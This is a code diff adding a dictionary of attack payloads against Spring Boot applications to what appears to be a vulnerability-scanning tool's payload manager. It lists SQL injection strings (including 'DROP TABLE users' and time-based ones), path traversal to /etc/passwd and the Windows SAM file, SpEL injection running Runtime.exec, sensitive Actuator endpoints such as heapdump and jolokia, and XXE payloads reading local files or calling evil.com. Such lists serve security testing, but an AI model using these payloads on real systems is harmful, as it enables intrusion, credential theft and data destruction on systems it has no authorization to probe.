@@ -431,6 +431,67 @@ class EnhancedPayloadManager:
         
         return payloads
     
+    SPRING_BOOT_PAYLOADS = {
+        'tianquan': [
+            {"tqToken": "admin"},
+            {"tqToken": "test"},
+            {"tqToken": "1"},
+            {"tqToken": "' OR '1'='1"},
+            {"tqToken": "' OR 1=1--"},
+            {"tqToken": "1' AND '1'='1"},
+            {"tqToken": "${random}"},
+            {"tqToken": "{{}}"},
+            {"tqToken": "${}}"},
+            {"tqToken": "123' OR '1'='1"},
+        ],
+        'path_traversal': [
+            "../etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "....//....//....//etc//passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
+        ],
+        'spel_injection': [
+            "${''.class}",
+            "${T(java.lang.Runtime).getRuntime().exec('id')}",
+            "${T(java.lang.ProcessBuilder).cmd('id')}",
+            "{{'a'.toUpperCase()}}",
+            "{{''.class.forName('java.lang.Runtime')}}",
+        ],
+        ' Actuator': [
+            "/actuator/env",
+            "/actuator/heapdump",
+            "/actuator/loggers",
+            "/actuator/threaddump",
+            "/actuator/metrics",
+            "/actuator/beans",
+            "/actuator/configprops",
+            "/actuator/auditevents",
+            "/actuator/scheduledtasks",
+            "/actuator/heapdump.gz",
+            "/actuator/jolokia",
+            "/actuator/env/{name}",
+        ],
+        'sql_injection': [
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "admin' OR '1'='1",
+            "1' AND SLEEP(5)--",
+            "1' AND BENCHMARK(5000000,SHA1('test'))--",
+            "1'; WAITFOR DELAY '00:05'--",
+            "' UNION SELECT NULL--",
+            "' UNION SELECT 1,2,3--",
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+            "1; DROP TABLE users--",
+        ],
+        'xxe': [
+            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil">]><foo>&xxe;</foo>',
+            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//W3C//EN" "file:///etc/passwd">]><foo>&xxe;</foo>',
+        ],
+    }
+
     @property
     def available_types(self) -> List[str]:
         """获取所有可用漏洞类型"""
